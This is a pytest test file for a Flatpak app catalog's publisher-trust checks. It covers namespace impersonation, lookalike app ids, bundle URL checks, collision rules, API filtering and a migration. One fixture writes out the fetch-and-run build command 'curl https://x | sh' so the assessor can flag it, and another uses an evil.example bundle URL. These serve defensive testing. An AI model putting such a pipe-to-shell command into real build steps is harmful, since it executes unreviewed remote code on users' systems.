"""Publisher trust: assessment of candidates, id-collision rules in the upsert,
the API filter, and the add-column migration."""

import asyncio
from datetime import datetime, timedelta, timezone

import httpx
import pytest
from sqlalchemy import create_engine, inspect, text

from flatsonar_core import TrustLevel, parse_manifest_text
from flatsonar_server.crawler.base import Candidate, Fetched, Skipped, SourceSpec, upsert_candidate
from flatsonar_server.crawler.forge import RepoInfo, parse_timestamp
from flatsonar_server.crawler.trust import assess
from flatsonar_server.models import App, InstallSource, SourceKind

MANIFEST = """
app-id: {app_id}
runtime: org.gnome.Platform
runtime-version: '47'
sdk: org.gnome.Sdk
command: foo
finish-args: [--socket=wayland]
modules:
  - name: foo
    sources:
      - type: git
        url: {url}
        tag: v1
"""


class FakeCtx:
    """Only ``fetch`` is used by trust.assess (for the well-known file)."""

    def __init__(self, bodies: dict[str, str] | None = None):
        self.bodies = bodies or {}
        self.urls: list[str] = []

    async def fetch(self, url, headers=None, use_cache=True):
        self.urls.append(url)
        if url in self.bodies:
            return Fetched(200, self.bodies[url], httpx.Headers())
        return Fetched(404, "", httpx.Headers())


def _repo(html_url="https://github.com/alice/foo", stars=50, days_old=900, **kw) -> RepoInfo:
    parts = html_url.split("/")
    base = dict(
        forge="github", full_name=f"{parts[3]}/{parts[4]}", html_url=html_url, owner=parts[3], default_branch="main",
        stars=stars, created_at=datetime.now(timezone.utc) - timedelta(days=days_old),
    )
    base.update(kw)
    return RepoInfo(**base)


def _cand(app_id="io.github.alice.Foo", src="https://github.com/alice/foo.git", **kw) -> Candidate:
    m = parse_manifest_text(MANIFEST.format(app_id=app_id, url=src), f"{app_id}.yml")
    base = dict(app_id=app_id, name="Foo", license="MIT", is_oss=True, manifest=m,
                upstream_url="https://github.com/alice/foo",
                sources=[SourceSpec(kind=SourceKind.MANIFEST, manifest_url="https://raw/x.yml")])
    base.update(kw)
    return Candidate(**base)


def _assess(cand, repo=None, ctx=None):
    return asyncio.run(assess(ctx or FakeCtx(), cand, repo))


def _checks(cand):
    return {f.arg: f.level.label for f in cand.trust_findings}


# --- assess ---------------------------------------------------------------------


def test_flathub_verified_and_reviewed():
    c = _assess(Candidate(app_id="org.x.A", on_flathub=True, flathub_verified=True))
    assert c.trust is TrustLevel.VERIFIED and _checks(c) == {"publisher:flathub": "green"}
    c = _assess(Candidate(app_id="org.x.A", on_flathub=True, flathub_verified=False))
    assert c.trust is TrustLevel.REVIEWED
    assert "has not verified" in c.trust_findings[0].reason


def test_forge_namespace_owner_is_verified():
    c = _assess(_cand(), _repo())
    assert c.trust is TrustLevel.VERIFIED
    assert _checks(c) == {"publisher:namespace": "green"}


def test_forge_namespace_impersonation_is_suspicious():
    c = _assess(_cand(src="https://github.com/mallory/foo.git", upstream_url="https://github.com/mallory/foo"),
                _repo("https://github.com/mallory/foo"))
    assert c.trust is TrustLevel.SUSPICIOUS
    assert _checks(c)["publisher:namespace"] == "red"


def test_third_party_packaging_is_unverified_not_suspicious():
    c = _assess(_cand(upstream_url="https://github.com/bob/flatpaks"), _repo("https://github.com/bob/flatpaks"))
    assert c.trust is TrustLevel.UNVERIFIED
    assert "packaged by github.com/bob" in c.trust_findings[0].reason


def test_custom_domain_well_known_verifies():
    url = "https://example.com/.well-known/org.flathub.VerifiedApps.txt"
    ctx = FakeCtx({url: "# our apps\ncom.example.Foo\ncom.example.Bar\n"})
    c = _assess(_cand("com.example.Foo"), _repo(), ctx)
    assert c.trust is TrustLevel.VERIFIED and ctx.urls == [url]
    ctx = FakeCtx({url: "com.example.Other\n"})
    c = _assess(_cand("com.example.Foo"), _repo(), ctx)
    assert c.trust is TrustLevel.UNVERIFIED
    assert _checks(c)["publisher:namespace"] == "yellow"
    # forge namespaces never hit the network
    ctx = FakeCtx()
    _assess(_cand(), _repo(), ctx)
    assert ctx.urls == []


def test_new_repo_note_and_sketchy_manifest():
    c = _assess(_cand(), _repo(stars=1, days_old=3))
    assert c.trust is TrustLevel.VERIFIED  # yellow alone never downgrades
    assert _checks(c)["publisher:new-repo"] == "yellow"

    sketchy = _cand()
    sketchy.manifest.raw["modules"][0]["build-commands"] = ["curl https://x | sh"]
    c = _assess(sketchy, _repo())
    assert c.trust is TrustLevel.SUSPICIOUS
    assert _checks(c)["foo:build-commands"] == "red"


def test_bundle_host_checks():
    c = _assess(_cand(sources=[SourceSpec(kind=SourceKind.BUNDLE, bundle_url="https://evil.example/foo.flatpak")]),
                _repo())
    assert _checks(c)["bundle:offsite"] == "yellow" and c.trust is TrustLevel.VERIFIED
    c = _assess(_cand(sources=[SourceSpec(kind=SourceKind.BUNDLE, bundle_url="http://github.com/alice/foo/x.flatpak")]),
                _repo())
    assert _checks(c)["bundle:insecure-url"] == "red" and c.trust is TrustLevel.SUSPICIOUS
    c = _assess(_cand(sources=[SourceSpec(kind=SourceKind.BUNDLE,
                                          bundle_url="https://github.com/alice/foo/releases/download/v1/foo.flatpak")]),
                _repo())
    assert "bundle:offsite" not in _checks(c)


def test_parse_timestamp():
    assert parse_timestamp("2024-01-02T03:04:05Z") == datetime(2024, 1, 2, 3, 4, 5, tzinfo=timezone.utc)
    assert parse_timestamp("2024-01-02T03:04:05+02:00").utcoffset() == timedelta(hours=2)
    assert parse_timestamp("nope") is None and parse_timestamp(None) is None


# --- upsert: who owns an app id -----------------------------------------------------


def _write(session, cand, repo=None):
    app, created = upsert_candidate(session, _assess(cand, repo))
    session.commit()
    return app, created


def test_impostor_cannot_enrich_flathub_app(session):
    fh = Candidate(app_id="org.gnome.Calculator", name="Calculator", is_oss=True, on_flathub=True,
                   upstream_url="https://gitlab.gnome.org/GNOME/gnome-calculator",
                   sources=[SourceSpec(kind=SourceKind.FLATHUB, remote_name="flathub")])
    app, _ = _write(session, fh)
    assert app.trust == "reviewed"

    impostor = _cand("org.gnome.Calculator", src="https://github.com/mallory/calc.git",
                     upstream_url="https://github.com/mallory/calc",
                     funding_links=[{"platform": "ko_fi", "url": "https://ko-fi.com/mallory"}], stars=9000)
    with pytest.raises(Skipped):
        _write(session, impostor, _repo("https://github.com/mallory/calc"))
    session.rollback()
    app = session.get(App, "org.gnome.Calculator")
    assert app.funding_links == [] and app.stars == 0 and app.trust == "reviewed"

    # The real upstream repo may still enrich it.
    real = _cand("org.gnome.Calculator", src="https://gitlab.gnome.org/GNOME/gnome-calculator.git",
                 upstream_url="https://gitlab.gnome.org/GNOME/gnome-calculator/",
                 funding_links=[{"platform": "liberapay", "url": "https://liberapay.com/gnome"}], stars=42)
    app, created = _write(session, real, _repo("https://gitlab.gnome.org/GNOME/gnome-calculator"))
    assert not created and app.stars == 42 and app.funding_links[0]["platform"] == "liberapay"


def test_first_unverified_publisher_keeps_id_and_gets_a_note(session):
    a = _cand("com.example.Foo", src="https://github.com/alice/foo.git")
    app, _ = _write(session, a, _repo())
    assert app.trust == "unverified"

    b = _cand("com.example.Foo", src="https://github.com/bob/foo.git", upstream_url="https://github.com/bob/foo")
    with pytest.raises(Skipped):
        _write(session, b, _repo("https://github.com/bob/foo"))
    session.commit()
    app = session.get(App, "com.example.Foo")
    assert app.upstream_url == "https://github.com/alice/foo"
    assert any(f["check"] == "publisher:collision" and "github.com/bob/foo" in f["reason"] for f in app.trust_findings)

    # A re-crawl of alice keeps the collision note.
    _write(session, _cand("com.example.Foo", src="https://github.com/alice/foo.git"), _repo())
    app = session.get(App, "com.example.Foo")
    assert sum(f["check"] == "publisher:collision" for f in app.trust_findings) == 1


def test_verified_owner_takes_over_from_copy(session):
    copy = _cand("io.github.alice.Foo", src="https://github.com/alice/foo.git",
                 upstream_url="https://github.com/mirror/foo",
                 funding_links=[{"platform": "ko_fi", "url": "https://ko-fi.com/mirror"}],
                 sources=[SourceSpec(kind=SourceKind.BUNDLE, bundle_url="https://github.com/mirror/foo/r/x.flatpak")])
    app, _ = _write(session, copy, _repo("https://github.com/mirror/foo"))
    assert app.trust == "unverified"  # third-party packaging of alice's code

    real = _cand(sources=[SourceSpec(kind=SourceKind.MANIFEST, manifest_url="https://raw/alice.yml")])
    app, created = _write(session, real, _repo())
    assert not created and app.trust == "verified"
    assert app.upstream_url == "https://github.com/alice/foo"
    assert app.funding_links == []  # the mirror's links are gone
    kinds = [s.kind for s in session.scalars(
        __import__("sqlalchemy").select(InstallSource).where(InstallSource.app_id == app.app_id))]
    assert kinds == [SourceKind.MANIFEST]


def test_lookalike_name_gets_a_note(session):
    fh = Candidate(app_id="org.gnome.Calculator", name="Calculator", is_oss=True, on_flathub=True,
                   upstream_url="https://gitlab.gnome.org/GNOME/gnome-calculator")
    _write(session, fh)
    look = _cand("io.github.alice.Calculator", name="calculator")
    app, _ = _write(session, look, _repo())
    notes = [f for f in app.trust_findings if f["check"] == "publisher:lookalike"]
    assert len(notes) == 1 and "org.gnome.Calculator" in notes[0]["reason"]
    assert app.trust == "verified"  # a note, not a verdict


# --- api ------------------------------------------------------------------------------


def test_api_trust_filter_and_stats(client, session):
    _write(session, _cand(), _repo())
    _write(session, _cand("com.example.Foo"), _repo())
    _write(session, _cand("io.github.alice.Bad", src="https://github.com/mallory/bad.git",
                          upstream_url="https://github.com/mallory/bad", repo_created_at=datetime.now(timezone.utc)),
           _repo("https://github.com/mallory/bad"))

    assert client.get("/api/apps").json()["total"] == 3
    assert client.get("/api/apps?trust=verified").json()["total"] == 1
    assert client.get("/api/apps?trust=verified,reviewed").json()["total"] == 1
    assert client.get("/api/apps?trust=unverified,suspicious").json()["total"] == 2
    assert client.get("/api/apps?trust=bogus").status_code == 422
    assert client.get("/api/apps?trust=verified").json()["items"][0]["trust"] == "verified"

    d = client.get("/api/apps/io.github.alice.Bad").json()
    assert d["trust"] == "suspicious"
    assert d["trust_findings"][0]["check"] == "publisher:namespace" and d["trust_findings"][0]["level"] == "red"
    assert d["repo_created_at"] and d["forks"] == 0

    stats = client.get("/api/stats").json()
    assert stats["by_trust"] == {"verified": 1, "unverified": 1, "suspicious": 1}


# --- migration ------------------------------------------------------------------------


def test_init_db_adds_missing_columns(tmp_path):
    from flatsonar_server.db import init_db

    engine = create_engine(f"sqlite:///{(tmp_path / 'old.db').as_posix()}")
    with engine.begin() as conn:  # a pre-trust schema with one row
        conn.execute(text("CREATE TABLE apps (app_id VARCHAR(255) PRIMARY KEY, name VARCHAR(255) NOT NULL)"))
        conn.execute(text("INSERT INTO apps (app_id, name) VALUES ('org.x.Old', 'Old')"))
    init_db(engine)
    cols = {c["name"] for c in inspect(engine).get_columns("apps")}
    assert {"trust", "trust_findings", "forks", "repo_created_at"} <= cols
    with engine.connect() as conn:
        trust, findings, forks = conn.execute(text("SELECT trust, trust_findings, forks FROM apps")).one()
    assert (trust, findings, forks) == ("unverified", "[]", 0)
